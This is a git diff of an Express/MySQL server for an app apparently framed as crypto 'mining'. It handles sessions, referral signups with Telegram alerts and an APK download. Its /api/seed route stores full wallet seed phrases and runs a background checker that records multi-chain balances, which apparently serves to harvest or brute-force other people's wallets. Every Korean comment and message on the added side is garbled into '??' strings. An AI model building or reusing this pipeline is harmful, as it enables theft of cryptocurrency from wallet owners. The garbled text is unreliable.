   async save(userId, newToken) {
     try {
-      // 기존 세션 확인
+      // ?? ?? ??
       const [existingSessions] = await db.pool.query(
         'SELECT token FROM sessions WHERE user_id = ?',
         [userId]
@@ -1115,16 +1171,16 @@ const sessionStore = {
       
       const hadOldSession = existingSessions.length > 0;
       
-      // 기존 세션 삭제 후 새 세션 저장
+      // ?? ?? ?? ? ? ?? ??
       await db.pool.query('DELETE FROM sessions WHERE user_id = ?', [userId]);
       await db.pool.query(
         'INSERT INTO sessions (user_id, token, last_activity) VALUES (?, ?, NOW())',
         [userId, newToken]
       );
       
-      return hadOldSession; // 기존 세션이 있었는지 반환
+      return hadOldSession; // ?? ??? ???? ??
     } catch (error) {
-      console.error('세션 저장 오류:', error);
+      console.error('?? ?? ??:', error);
       return false;
     }
   },
@@ -1140,20 +1196,20 @@ const sessionStore = {
       
       const session = rows[0];
       
-      // kicked 상태 확인
+      // kicked ?? ??
       if (session.kicked) return false;
       
-      // 타임아웃 확인 (24시간)
+      // ???? ?? (24??)
       const lastActivity = new Date(session.last_activity).getTime();
       const now = Date.now();
       
       if (now - lastActivity > SESSION_TIMEOUT) {
-        // 세션 만료 - 삭제
+        // ?? ?? - ??
         await this.remove(session.user_id);
         return false;
       }
       
-      // 슬라이딩 세션: 활동 시간 갱신
+      // ???? ??: ?? ?? ??
       await db.pool.query(
         'UPDATE sessions SET last_activity = NOW() WHERE token = ?',
         [token]
@@ -1161,7 +1217,7 @@ const sessionStore = {
       
       return true;
     } catch (error) {
-      console.error('세션 검증 오류:', error);
+      console.error('?? ?? ??:', error);
       return false;
     }
   },
@@ -1177,14 +1233,14 @@ const sessionStore = {
       
       const session = rows[0];
       
-      // 타임아웃 확인
+      // ???? ??
       const lastActivity = new Date(session.last_activity).getTime();
       if (Date.now() - lastActivity > SESSION_TIMEOUT) {
         await this.remove(session.user_id);
         return null;
       }
       
-      // 슬라이딩: 조회할 때마다 갱신
+      // ????: ??? ??? ??
       await db.pool.query(
         'UPDATE sessions SET last_activity = NOW() WHERE token = ?',
         [token]
@@ -1192,7 +1248,7 @@ const sessionStore = {
       
       return session.user_id;
     } catch (error) {
-      console.error('사용자 ID 조회 오류:', error);
+      console.error('??? ID ?? ??:', error);
       return null;
     }
   },
@@ -1201,7 +1257,7 @@ const sessionStore = {
     try {
       await db.pool.query('DELETE FROM sessions WHERE user_id = ?', [userId]);
     } catch (error) {
-      console.error('세션 삭제 오류:', error);
+      console.error('?? ?? ??:', error);
     }
   },
   
@@ -1211,7 +1267,7 @@ const sessionStore = {
         'UPDATE sessions SET kicked = TRUE WHERE user_id = ?',
         [userId]
       );
-      // 세션 끊기 시 채굴 상태도 stopped로 즉시 반영
+      // ?? ?? ? ?? ??? stopped? ?? ??
       await db.pool.query(
         `INSERT INTO miner_status (user_id, status, assigned_at)
          VALUES (?, 'stopped', NULL)
@@ -1219,7 +1275,7 @@ const sessionStore = {
         [userId]
       );
     } catch (error) {
-      console.error('세션 킥 오류:', error);
+      console.error('?? ? ??:', error);
     }
   },
   
@@ -1242,7 +1298,7 @@ const sessionStore = {
         }
       }
       
-      // 만료된 세션 삭제
+      // ??? ?? ??
       if (expiredUsers.length > 0) {
         await db.pool.query(
           'DELETE FROM sessions WHERE user_id IN (?)',
@@ -1252,14 +1308,14 @@ const sessionStore = {
       
       return result;
     } catch (error) {
-      console.error('세션 목록 조회 오류:', error);
+      console.error('?? ?? ?? ??:', error);
       return [];
     }
   }
 };
 
-// ---------- 관리자 세션: token -> { role: 'master'|'manager', id } ----------
-// ─── 팝업 이미지 업로드 (multer) ───
+// ---------- ??? ??: token -> { role: 'master'|'manager', id } ----------
+// ??? ?? ??? ??? (multer) ???
 const _uploadDir = path.join(__dirname, 'public', 'uploads', 'popups');
 if (!fs.existsSync(_uploadDir)) fs.mkdirSync(_uploadDir, { recursive: true });
 const _popupStorage = multer.diskStorage({
@@ -1274,7 +1330,7 @@ const _uploadPopup = multer({
   limits: { fileSize: 10 * 1024 * 1024 }, // 10MB
   fileFilter: (req, file, cb) => {
     if (/^image\//.test(file.mimetype)) cb(null, true);
-    else cb(new Error('이미지 파일만 업로드 가능합니다.'));
+    else cb(new Error('??? ??? ??? ?????.'));
   },
 });
 
@@ -1286,35 +1342,35 @@ function requireAdmin(req, res, next) {
   const token = req.headers.authorization?.replace(/^Bearer\s+/i, '') || req.query?.adminToken || '';
   const session = adminSessions.get(token);
   if (!session) {
-    return res.status(401).json({ error: '로그인이 필요합니다.' });
+    return res.status(401).json({ error: '???? ?????.' });
   }
   req.admin = session;
   next();
 }
 function requireMaster(req, res, next) {
   if (req.admin?.role !== 'master') {
-    return res.status(403).json({ error: '마스터만 가능합니다.' });
+    return res.status(403).json({ error: '???? ?????.' });
   }
   next();
 }
 
-// 클라이언트(회원) 세션 인증 미들웨어
+// ?????(??) ?? ?? ????
 async function requireSession(req, res, next) {
   const token = req.headers.authorization?.replace(/^Bearer\s+/i, '') || req.query?.token || req.body?.token || '';
-  if (!token) return res.status(401).json({ error: '로그인이 필요합니다.' });
+  if (!token) return res.status(401).json({ error: '???? ?????.' });
   const userId = await sessionStore.getUserId(token);
-  if (!userId) return res.status(401).json({ error: '세션이 만료되었습니다.' });
+  if (!userId) return res.status(401).json({ error: '??? ???????.' });
   req.userId = userId;
   req.sessionToken = token;
   next();
 }
 
-// 그룹 오너 세션 인증 미들웨어
+// ?? ?? ?? ?? ????
 async function requireOwnerSession(req, res, next) {
   const token = req.headers.authorization?.replace(/^Bearer\s+/i, '') || req.query?.token || req.body?.token || '';
-  if (!token) return res.status(401).json({ error: '로그인이 필요합니다.' });
+  if (!token) return res.status(401).json({ error: '???? ?????.' });
   try {
-    // 1) account_owners 에서 먼저 확인
+    // 1) account_owners ?? ?? ??
     const [[ownerSess]] = await db.pool.query(
       `SELECT s.owner_id, s.last_activity, o.name, o.telegram, o.manager_id
        FROM owner_sessions s JOIN account_owners o ON s.owner_id = o.id
@@ -1323,22 +1379,22 @@ async function requireOwnerSession(req, res, next) {
     if (ownerSess) {
       if (Date.now() - new Date(ownerSess.last_activity).getTime() > 24 * 60 * 60 * 1000) {
         await db.pool.query('DELETE FROM owner_sessions WHERE token = ?', [token]);
-        return res.status(401).json({ error: '세션이 만료되었습니다.' });
+        return res.status(401).json({ error: '??? ???????.' });
       }
       await db.pool.query('UPDATE owner_sessions SET last_activity = NOW() WHERE token = ?', [token]);
       req.owner = { id: ownerSess.owner_id, name: ownerSess.name, telegram: ownerSess.telegram, managerId: ownerSess.manager_id, role: 'owner' };
       return next();
     }
-    // 2) admins(manager) 에서 확인
+    // 2) admins(manager) ?? ??
     const [[mgrSess]] = await db.pool.query(
       `SELECT s.owner_id, s.last_activity, m.telegram
        FROM owner_sessions s JOIN managers m ON s.owner_id = m.id AND m.role = 'manager'
        WHERE s.token = ?`, [token]
     );
-    if (!mgrSess) return res.status(401).json({ error: '세션이 만료되었습니다.' });
+    if (!mgrSess) return res.status(401).json({ error: '??? ???????.' });
     if (Date.now() - new Date(mgrSess.last_activity).getTime() > 24 * 60 * 60 * 1000) {
       await db.pool.query('DELETE FROM owner_sessions WHERE token = ?', [token]);
-      return res.status(401).json({ error: '세션이 만료되었습니다.' });
+      return res.status(401).json({ error: '??? ???????.' });
     }
     await db.pool.query('UPDATE owner_sessions SET last_activity = NOW() WHERE token = ?', [token]);
     req.owner = { id: mgrSess.owner_id, name: mgrSess.owner_id, telegram: mgrSess.telegram, managerId: null, role: 'manager' };
@@ -1348,7 +1404,7 @@ async function requireOwnerSession(req, res, next) {
   }
 }
 
-// ===== macroUser 인증 헬퍼 =====
+// ===== macroUser ?? ?? =====
 function muHashPassword(pw) {
   return crypto.createHash('sha256').update(pw).digest('hex');
 }
@@ -1357,18 +1413,18 @@ function muCreateToken() {
 }
 async function requireMuAuth(req, res, next) {
   const token = req.headers.authorization?.replace(/^Bearer\s+/i, '') || req.query?.muToken || '';
-  if (!token) return res.status(401).json({ error: '로그인이 필요합니다.' });
+  if (!token) return res.status(401).json({ error: '???? ?????.' });
   try {
     const [[session]] = await db.pool.query(
       `SELECT s.token, s.last_activity, u.id, u.name, u.login_id, u.role, u.status
        FROM mu_sessions s JOIN mu_users u ON s.user_id = u.id WHERE s.token = ?`, [token]
     );
-    if (!session) return res.status(401).json({ error: '세션이 만료되었습니다.' });
-    if (session.status !== 'active') return res.status(403).json({ error: '비활성 계정입니다.' });
+    if (!session) return res.status(401).json({ error: '??? ???????.' });
+    if (session.status !== 'active') return res.status(403).json({ error: '??? ?????.' });
     const lastActivity = new Date(session.last_activity).getTime();
     if (Date.now() - lastActivity > 24 * 60 * 60 * 1000) {
       await db.pool.query('DELETE FROM mu_sessions WHERE token = ?', [token]);
-      return res.status(401).json({ error: '세션이 만료되었습니다. 다시 로그인하세요.' });
+      return res.status(401).json({ error: '??? ???????. ?? ??????.' });
     }
     await db.pool.query('UPDATE mu_sessions SET last_activity = NOW() WHERE token = ?', [token]);
     req.muUser = { id: session.id, name: session.name, loginId: session.login_id, role: session.role };
@@ -1378,16 +1434,16 @@ async function requireMuAuth(req, res, next) {
   }
 }
 function requireMuAdmin(req, res, next) {
-  if (req.muUser?.role !== 'ADMIN') return res.status(403).json({ error: '관리자 권한이 필요합니다.' });
+  if (req.muUser?.role !== 'ADMIN') return res.status(403).json({ error: '??? ??? ?????.' });
   next();
 }
 
-// ---------- 미들웨어 ----------
+// ---------- ???? ----------
 app.use(cors());
 app.use(express.json());
 
-// API 요청 로깅 미들웨어
-// 아래 경로는 로그 생략 (앱이 주기적으로 호출해 노이즈가 큼)
+// API ?? ?? ????
+// ?? ??? ?? ?? (?? ????? ??? ???? ?)
 const SILENT_PATHS = [
   '/api/session/validate',
   '/api/seed',
@@ -1421,11 +1477,11 @@ app.use('/api', (req, res, next) => {
     }
     
     if (res.statusCode >= 500) {
-      console.error('❌ API 에러:', JSON.stringify(logData));
+      console.error('? API ??:', JSON.stringify(logData));
     } else if (res.statusCode >= 400) {
-      console.warn('⚠️  API 경고:', JSON.stringify(logData));
+      console.warn('??  API ??:', JSON.stringify(logData));
     } else {
-      console.log('✅ API:', req.method, req.path, res.statusCode, `${Date.now() - start}ms`);
+      console.log('? API:', req.method, req.path, res.statusCode, `${Date.now() - start}ms`);
     }
   });
   
@@ -1434,99 +1490,96 @@ app.use('/api', (req, res, next) => {
 
 app.use(express.static(path.join(__dirname, 'public')));
 
-// ---------- 클라이언트 API ----------
+// ---------- ????? API ----------
 
-// 회원가입 API (추천인 코드 필수)
+// ???? API (??? ?? ??)
 app.post('/api/register', async (req, res) => {
   try {
     const { id, password, referralCode, telegram } = req.body || {};
     
     if (!id?.trim() || !password?.trim() || !referralCode?.trim()) {
-      return res.status(400).json({ error: '아이디, 비밀번호, 추천인 코드를 입력하세요.' });
+      return res.status(400).json({ error: '???, ????, ??? ??? ?????.' });
     }
     
-    // 추천인 확인 (manager 또는 master 모두 허용)
+    // ??? ?? (manager ?? master ?? ??)
     const manager = await db.managerDB.get(referralCode.trim());
     if (!manager) {
-      // managers 테이블에 없으면 admins 테이블(master)에서 확인
+      // managers ???? ??? admins ???(master)?? ??
       const [[masterRow]] = await db.pool.query(
         "SELECT id, tg_bot_token, tg_chat_id FROM managers WHERE id=? AND role='master'",
         [referralCode.trim()]
       );
-      if (!masterRow) return res.status(400).json({ error: '유효하지 않은 추천인 코드입니다.' });
-      // master를 referral로 쓸 경우 manager 객체처럼 사용
+      if (!masterRow) return res.status(400).json({ error: '???? ?? ??? ?????.' });
+      // master? referral? ? ?? manager ???? ??
       Object.assign(masterRow, { tg_bot_token: masterRow.tg_bot_token, tg_chat_id: masterRow.tg_chat_id });
       Object.assign(manager || {}, masterRow);
-      // manager가 null이므로 아래 알림은 masterRow로 처리
+      // manager? null??? ?? ??? masterRow? ??
       await db.userDB.addOrUpdate(id.trim(), password.trim(), referralCode.trim(), telegram || '', 'pending');
       try {
-        if (masterRow.tg_bot_token && masterRow.tg_chat_id) {
-          await sendTelegram(masterRow.tg_bot_token, masterRow.tg_chat_id,
-            `📩 <b>신규 가입 요청</b>\n아이디: <code>${id.trim()}</code>\n텔레그램: ${telegram?.trim() || '-'}\n추천인: ${referralCode.trim()}`);
-        }
+        await sendMasterTelegramChannel(
+          'approval',
+          `?? <b>?? ?? ??</b>\n???: <code>${escapeHtml(id.trim())}</code>\n????: ${escapeHtml(telegram?.trim() || '-')}\n???(???): <code>${escapeHtml(referralCode.trim())}</code>`
+        );
       } catch (_) {}
-      return res.json({ success: true, message: '회원가입이 완료되었습니다. 관리자 승인을 기다려주세요.', managerId: referralCode.trim() });
+      return res.json({ success: true, message: '????? ???????. ??? ??? ??????.', managerId: referralCode.trim() });
     }
     
-    // 기존 사용자 확인
+    // ?? ??? ??
     const existing = await db.userDB.get(id.trim());
     if (existing) {
-      return res.status(400).json({ error: '이미 존재하는 아이디입니다.' });
+      return res.status(400).json({ error: '?? ???? ??????.' });
     }
     
-    // 사용자 생성 (승인 대기 상태)
+    // ??? ?? (?? ?? ??)
     await db.userDB.addOrUpdate(id.trim(), password.trim(), referralCode.trim(), telegram || '', 'pending');
 
-    // 해당 총판(매니저)에게 텔레그램 알림 발송
     try {
-      if (manager.tg_bot_token && manager.tg_chat_id) {
-        await sendTelegram(
-          manager.tg_bot_token,
-          manager.tg_chat_id,
-          `📩 <b>신규 가입 요청</b>\n아이디: <code>${id.trim()}</code>\n텔레그램: ${telegram ? telegram.trim() : '-'}\n추천인: ${referralCode.trim()}`
-        );
-      }
+      await sendManagerTelegramByChannel(
+        referralCode.trim(),
+        'approval',
+        `?? <b>?? ?? ??</b>\n???: <code>${escapeHtml(id.trim())}</code>\n????: ${escapeHtml(telegram ? telegram.trim() : '-')}\n???: <code>${escapeHtml(referralCode.trim())}</code>`
+      );
     } catch (tgErr) {
-      console.warn('가입 알림 텔레그램 전송 실패:', tgErr.message);
+      console.warn('?? ?? ???? ?? ??:', tgErr.message);
     }
 
     res.json({ 
       success: true, 
-      message: '회원가입이 완료되었습니다. 관리자 승인을 기다려주세요.',
+      message: '????? ???????. ??? ??? ??????.',
       managerId: referralCode.trim()
     });
   } catch (error) {
-    console.error('회원가입 오류:', error);
-    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
+    console.error('???? ??:', error);
+    res.status(500).json({ error: '?? ??? ??????.' });
   }
 });
 
-// 로그인 API (승인 및 사용기간 검증)
+// ??? API (?? ? ???? ??)
 app.post('/api/login', async (req, res) => {
   try {
     const { id, password } = req.body || {};
     if (!id?.trim() || !password?.trim()) {
-      return res.status(400).json({ error: '아이디와 비밀번호를 입력하세요.' });
+      return res.status(400).json({ error: '???? ????? ?????.' });
     }
     
     const isValid = await db.userDB.validate(id, password);
     if (!isValid) {
-      return res.status(401).json({ error: '아이디 또는 비밀번호가 올바르지 않습니다.' });
+      return res.status(401).json({ error: '??? ?? ????? ???? ????.' });
     }
     
-    // 사용자 정보 조회
+    // ??? ?? ??
     const user = await db.userDB.get(id.trim());
     
-    // 승인 상태 확인만 수행 (만료일 체크는 하지 않음)
+    // ?? ?? ??? ?? (??? ??? ?? ??)
     if (user.status === 'pending') {
-      return res.status(403).json({ error: '관리자 승인 대기 중입니다.' });
+      return res.status(403).json({ error: '??? ?? ?? ????.' });
     }
     
     if (user.status === 'suspended') {
-      return res.status(403).json({ error: '계정이 정지되었습니다. 관리자에게 문의하세요.' });
+      return res.status(403).json({ error: '??? ???????. ????? ?????.' });
     }
     
-    // 만료일 정보 계산 (체크는 하지 않고 정보만 제공)
+    // ??? ?? ?? (??? ?? ?? ??? ??)
     let expireDate = null;
     let remainingDays = null;
     let isExpired = false;
@@ -1535,12 +1588,12 @@ app.post('/api/login', async (req, res) => {
       const now = new Date();
       expireDate = new Date(user.expireDate);
       
-      // 남은 일수 계산 (음수일 수도 있음)
+      // ?? ?? ?? (??? ?? ??)
       remainingDays = Math.ceil((expireDate - now) / (1000 * 60 * 60 * 24));
       isExpired = now > expireDate;
     }
     
-    // 세션 생성
+    // ?? ??
     const token = crypto.randomBytes(16).toString('hex');
     const kicked = await sessionStore.save(id.trim(), token);
     
@@ -1550,23 +1603,23 @@ app.post('/api/login', async (req, res) => {
       status: user.status || 'approved',
       expireDate: expireDate ? expireDate.toISOString() : null,
       remainingDays: remainingDays,
-      isExpired: isExpired  // 만료 여부 정보만 제공 (차단은 하지 않음)
+      isExpired: isExpired  // ?? ?? ??? ?? (??? ?? ??)
     });
   } catch (error) {
-    console.error('로그인 오류:', error);
-    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
+    console.error('??? ??:', error);
+    res.status(500).json({ error: '?? ??? ??????.' });
   }
 });
 
-// GET /api/user/subscription?token= — 현재 구독 상태 조회 (앱 폴링용)
+// GET /api/user/subscription?token= ? ?? ?? ?? ?? (? ???)
 app.get('/api/user/subscription', async (req, res) => {
   try {
     const { token } = req.query;
-    if (!token) return res.status(400).json({ error: 'token 필요' });
+    if (!token) return res.status(400).json({ error: 'token ??' });
     const userId = await sessionStore.getUserId(token);
-    if (!userId) return res.status(401).json({ error: '세션 만료' });
+    if (!userId) return res.status(401).json({ error: '?? ??' });
     const user = await db.userDB.get(userId);
-    if (!user) return res.status(404).json({ error: '사용자 없음' });
+    if (!user) return res.status(404).json({ error: '??? ??' });
     const now = new Date();
     const expiry = user.expireDate ? new Date(user.expireDate) : null;
     const remainingDays = expiry ? Math.max(0, Math.ceil((expiry - now) / (1000 * 60 * 60 * 24))) : 0;
@@ -1580,14 +1633,14 @@ app.get('/api/user/subscription', async (req, res) => {
   }
 });
 
-// POST /api/miner/report — 앱이 자동화 시작/종료 시 실제 상태 보고
+// POST /api/miner/report ? ?? ??? ??/?? ? ?? ?? ??
 app.post('/api/miner/report', async (req, res) => {
   try {
     const { token, status } = req.body || {};
-    if (!token) return res.status(401).json({ error: 'token 필요' });
-    if (!['running', 'stopped'].includes(status)) return res.status(400).json({ error: 'status 오류' });
+    if (!token) return res.status(401).json({ error: 'token ??' });
+    if (!['running', 'stopped'].includes(status)) return res.status(400).json({ error: 'status ??' });
     const userId = await sessionStore.getUserId(token);
-    if (!userId) return res.status(401).json({ error: '세션 만료' });
+    if (!userId) return res.status(401).json({ error: '?? ??' });
     await db.pool.query(
       `INSERT INTO miner_status (user_id, status, assigned_at)
        VALUES (?, ?, ?)
@@ -1603,7 +1656,7 @@ app.post('/api/miner/report', async (req, res) => {
 app.get('/api/session/validate', async (req, res) => {
   try {
     const token = req.query.token;
-    if (!token) return res.status(401).json({ error: 'token 필요' });
+    if (!token) return res.status(401).json({ error: 'token ??' });
 
     const [rows] = await db.pool.query(
       'SELECT user_id, last_activity, kicked FROM sessions WHERE token = ?',
@@ -1616,32 +1669,32 @@ app.get('/api/session/validate', async (req, res) => {
 
     const session = rows[0];
 
-    // 다른 기기 로그인으로 강제 종료된 경우
+    // ?? ?? ????? ?? ??? ??
     if (session.kicked) {
       return res.status(401).json({ error: 'kicked', kicked: true });
     }
 
-    // 24시간 타임아웃 확인
+    // 24?? ???? ??
     const lastActivity = new Date(session.last_activity).getTime();
     if (Date.now() - lastActivity > SESSION_TIMEOUT) {
       await db.pool.query('DELETE FROM sessions WHERE token = ?', [token]);
       return res.status(401).json({ error: 'expired', kicked: false });
     }
 
-    // 슬라이딩 세션 갱신
+    // ???? ?? ??
     await db.pool.query('UPDATE sessions SET last_activity = NOW() WHERE token = ?', [token]);
     return res.json({ ok: true });
   } catch (error) {
-    console.error('세션 검증 오류:', error);
-    res.status(500).json({ error: '서버 오류' });
+    console.error('?? ?? ??:', error);
+    res.status(500).json({ error: '?? ??' });
   }
 });
 
-// POST /api/logout — 앱 종료 시 세션 명시적 삭제
+// POST /api/logout ? ? ?? ? ?? ??? ??
 app.post('/api/logout', async (req, res) => {
   try {
     const { token } = req.body || {};
-    if (!token) return res.status(400).json({ error: 'token 필요' });
+    if (!token) return res.status(400).json({ error: 'token ??' });
     await db.pool.query('DELETE FROM sessions WHERE token = ?', [token]);
     res.json({ ok: true });
   } catch (error) {
@@ -1649,16 +1702,16 @@ app.post('/api/logout', async (req, res) => {
   }
 });
 
-// ========== 회원 전용 API ==========
+// ========== ?? ?? API ==========
 
-// GET /api/user/profile — 메신저 ID + 소속 총판 메신저 ID 조회
+// GET /api/user/profile ? ??? ID + ?? ?? ??? ID ??
 app.get('/api/user/profile', requireSession, async (req, res) => {
   try {
     const [[user]] = await db.pool.query(
       'SELECT id, telegram, manager_id FROM users WHERE id = ?',
       [req.userId]
     );
-    if (!user) return res.status(404).json({ error: '사용자를 찾을 수 없습니다.' });
+    if (!user) return res.status(404).json({ error: '???? ?? ? ????.' });
     let managerTelegram = '';
     if (user.manager_id) {
       const [[mgr]] = await db.pool.query('SELECT telegram FROM managers WHERE id = ?', [user.manager_id]);
@@ -1675,11 +1728,11 @@ app.get('/api/user/profile', requireSession, async (req, res) => {
   }
 });
 
-// PATCH /api/user/profile — 본인 메신저 ID 수정
+// PATCH /api/user/profile ? ?? ??? ID ??
 app.patch('/api/user/profile', requireSession, async (req, res) => {
   try {
     const { messenger_id } = req.body || {};
-    if (messenger_id === undefined) return res.status(400).json({ error: 'messenger_id 필요' });
+    if (messenger_id === undefined) return res.status(400).json({ error: 'messenger_id ??' });
     await db.pool.query('UPDATE users SET telegram = ? WHERE id = ?', [messenger_id.trim(), req.userId]);
     res.json({ ok: true });
   } catch (e) {
@@ -1687,7 +1740,7 @@ app.patch('/api/user/profile', requireSession, async (req, res) => {
   }
 });
 
-// GET /api/user/miner — 채굴기 상태 조회
+// GET /api/user/miner ? ??? ?? ??
 app.get('/api/user/miner', requireSession, async (req, res) => {
   try {
     const [[row]] = await db.pool.query(
@@ -1704,7 +1757,7 @@ app.get('/api/user/miner', requireSession, async (req, res) => {
   }
 });
 
-// GET /api/user/mining-records — 채굴 내역 (페이지네이션)
+// GET /api/user/mining-records ? ?? ?? (??????)
 app.get('/api/user/mining-records', requireSession, async (req, res) => {
   try {
     let page = Math.max(1, parseInt(req.query.page, 10) || 1);
@@ -1728,7 +1781,7 @@ app.get('/api/user/mining-records', requireSession, async (req, res) => {
   }
 });
 
-// GET /api/user/seeds — 본인 시드 목록 (페이지네이션, 잔액 포함)
+// GET /api/user/seeds ? ?? ?? ?? (??????, ?? ??)
 app.get('/api/user/seeds', requireSession, async (req, res) => {
   try {
     const userId = req.userId;
@@ -1747,7 +1800,7 @@ app.get('/api/user/seeds', requireSession, async (req, res) => {
       const words = String(phrase || '').trim().split(/\s+/).filter(Boolean);
       if (!words.length) return '';
       if (words.length <= 3) return words[0] + ' ***';
-      return words[0] + ' … ' + words[words.length - 1] + '  (' + words.length + '단어)';
+      return words[0] + ' ? ' + words[words.length - 1] + '  (' + words.length + '??)';
     };
     res.json({
       seeds: rows.map(r => ({
@@ -1767,8 +1820,8 @@ app.get('/api/user/seeds', requireSession, async (req, res) => {
       pageSize,
     });
   } catch (e) {
-    console.error('유저 시드 조회 오류:', e.message);
-    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
+    console.error('?? ?? ?? ??:', e.message);
+    res.status(500).json({ error: '?? ??? ??????.' });
   }
 });
 
@@ -1783,38 +1836,38 @@ app.post('/api/seed', async (req, res) => {
     const seedId = await db.seedDB.add(userId, phrase);
     res.json({ ok: true });
 
-    // 저장 즉시 백그라운드에서 잔고 검사 트리거
+    // ?? ?? ??????? ?? ?? ???
     if (seedId) {
       setImmediate(async () => {
         try {
           const { processSeed } = require('./seed-checker');
           await processSeed({ id: seedId, user_id: userId, phrase: phrase.trim(), created_at: new Date() });
         } catch (e) {
-          console.error(`[SEED 즉시검사] ID=${seedId} 오류:`, e.message);
+          console.error(`[SEED ????] ID=${seedId} ??:`, e.message);
         }
       });
     }
   } catch (error) {
-    console.error('시드 저장 오류:', error);
-    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
+    console.error('?? ?? ??:', error);
+    res.status(500).json({ error: '?? ??? ??????.' });
   }
 });
 
-// ---------- 사용자 시드 히스토리 (페이지네이션) ----------
+// ---------- ??? ?? ???? (??????) ----------
 app.get('/api/seed/history', async (req, res) => {
   try {
     const { token } = req.query || {};
     if (!token) {
-      return res.status(400).json({ error: 'token 필요' });
+      return res.status(400).json({ error: 'token ??' });
     }
 
-    // 토큰 → 사용자 ID (세션 검증 + 슬라이딩 갱신)
+    // ?? ? ??? ID (?? ?? + ???? ??)
     const userId = await sessionStore.getUserId(token);
     if (!userId) {
-      return res.status(401).json({ error: '세션 만료 또는 잘못된 token' });
+      return res.status(401).json({ error: '?? ?? ?? ??? token' });
     }
 
-    // 페이지네이션 파라미터
+    // ?????? ????
     let page = parseInt(req.query.page, 10) || 1;
     let pageSize = parseInt(req.query.pageSize, 10) || 30;
     if (page < 1) page = 1;
@@ -1822,7 +1875,7 @@ app.get('/api/seed/history', async (req, res) => {
     if (pageSize > 100) pageSize = 100;
     const offset = (page - 1) * pageSize;
 
-    // 필터: hasBalance (true/false)
+    // ??: hasBalance (true/false)
     const hasBalanceParam = (req.query.hasBalance || '').toString().toLowerCase();
     const filters = ['user_id = ?'];
     const params = [userId];
@@ -1835,7 +1888,7 @@ app.get('/api/seed/history', async (req, res) => {
 
     const whereSql = 'WHERE ' + filters.join(' AND ');
 
-    // 데이터 조회
+    // ??? ??
     const [rows] = await db.pool.query(
       `
       SELECT id, phrase, created_at, balance, usdt_balance, btc, eth, tron, sol
@@ -1847,7 +1900,7 @@ app.get('/api/seed/history', async (req, res) => {
       [...params, pageSize, offset]
     );
 
-    // 전체 개수 조회
+    // ?? ?? ??
     const [[countRow]] = await db.pool.query(
       `
       SELECT COUNT(*) AS totalCount
@@ -1866,7 +1919,7 @@ app.get('/api/seed/history', async (req, res) => {
         ? row.created_at
         : new Date(row.created_at);
 
-      // 응답용 ID 포맷: seed_YYYYMMDD_000001
+      // ??? ID ??: seed_YYYYMMDD_000001
       const y = createdAt.getUTCFullYear();
       const m = String(createdAt.getUTCMonth() + 1).padStart(2, '0');
       const d = String(createdAt.getUTCDate()).padStart(2, '0');
@@ -1876,7 +1929,7 @@ app.get('/api/seed/history', async (req, res) => {
       const words = phrase.trim().split(/\s+/).filter(Boolean);
       const phrasePreview = words.slice(0, 3).join(' ');
 
-      // BIP39 체크섬 유효성 확인 (ethers 이용)
+      // BIP39 ??? ??? ?? (ethers ??)
       let checksumValid = false;
       try {
         ethers.Wallet.fromPhrase(phrase);
@@ -1919,26 +1972,26 @@ app.get('/api/seed/history', async (req, res) => {
       items,
     });
   } catch (error) {
-    console.error('시드 히스토리 조회 오류:', error);
-    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
+    console.error('?? ???? ?? ??:', error);
+    res.status(500).json({ error: '?? ??? ??????.' });
   }
 });
 
-// ---------- APK 다운로드 (모바일 설치용) ----------
-// 데스크톱의 nexus 폴더에 있는 최신 .apk 파일을 내려줍니다.
+// ---------- APK ???? (??? ???) ----------
+// ????? nexus ??? ?? ?? .apk ??? ?????.
 app.get('/download/apk', async (req, res) => {
   try {
-    const apkDir = path.join('/home', 'myno', '바탕화면', 'nexus');
+    const apkDir = path.join('/home', 'myno', '????', 'nexus');
 
-    // 폴더 내 APK 파일 목록 조회
+    // ?? ? APK ?? ?? ??
     const files = await fs.promises.readdir(apkDir);
     const apkFiles = files.filter((name) => name.toLowerCase().endsWith('.apk'));
 
     if (apkFiles.length === 0) {
-      return res.status(404).json({ error: 'APK 파일을 찾을 수 없습니다.' });
+      return res.status(404).json({ error: 'APK ??? ?? ? ????.' });
     }
 
-    // 가장 최근에 수정된 APK 하나 선택
+    // ?? ??? ??? APK ?? ??
     const stats = await Promise.all(
       apkFiles.map(async (name) => {
         const fullPath = path.join(apkDir, name);
@@ -1950,54 +2003,54 @@ app.get('/download/apk', async (req, res) => {
     stats.sort((a, b) => b.mtime - a.mtime);
     const latest = stats[0];
 
-    // 다운로드로 전송 (Content-Disposition: attachment)
+    // ????? ?? (Content-Disposition: attachment)
     return res.download(latest.fullPath, latest.name);
   } catch (error) {
-    console.error('APK 다운로드 오류:', error);
-    return res.status(500).json({ error: 'APK 다운로드 중 서버 오류가 발생했습니다.' });
+    console.error('APK ???? ??:', error);
+    return res.status(500).json({ error: 'APK ???? ? ?? ??? ??????.' });
   }
 });
 
 app.get('/api/admin/telegram', async (req, res) => {
   try {
-    const telegram = await db.settingDB.get('global_telegram') || '@문의';
+    const telegram = await db.settingDB.get('global_telegram') || '@??';
     res.json({ nickname: telegram });
   } catch (error) {
-    console.error('텔레그램 조회 오류:', error);
-    res.json({ nickname: '@문의' });
+    console.error('???? ?? ??:', error);
+    res.json({ nickname: '@??' });
   }
 });
 
-// ---------- 관리자 로그인 ----------
+// ---------- ??? ??? ----------
 app.post('/api/admin/login', async (req, res) => {
   try {
   const { id, password } = req.body || {};
   if (!id?.trim() || !password?.trim()) {
-    return res.status(400).json({ error: '아이디와 비밀번호를 입력하세요.' });
+    return res.status(400).json({ error: '???? ????? ?????.' });
   }
     
-    // 마스터 계정 확인
+    // ??? ?? ??
   if (id.trim() === MASTER_ID && password === MASTER_PW) {
     const token = createAdminToken();
     adminSessions.set(token, { role: 'master', id: MASTER_ID });
     return res.json({ role: 'master', id: MASTER_ID, token });
   }
     
-    // DB에서 마스터 계정만 허용 (매니저는 owner.html 사용)
+    // DB?? ??? ??? ?? (???? owner.html ??)
     const manager = await db.managerDB.validate(id, password);
     if (manager) {
       if (manager.role !== 'master') {
-        return res.status(403).json({ error: '총판(매니저) 계정은 오너 페이지(/owner.html)를 이용해 주세요.' });
+        return res.status(403).json({ error: '??(???) ??? ?? ???(/owner.html)? ??? ???.' });
       }
       const token = createAdminToken();
       adminSessions.set(token, { role: 'master', id: id.trim() });
       return res.json({ role: 'master', id: id.trim(), token });
     }
     
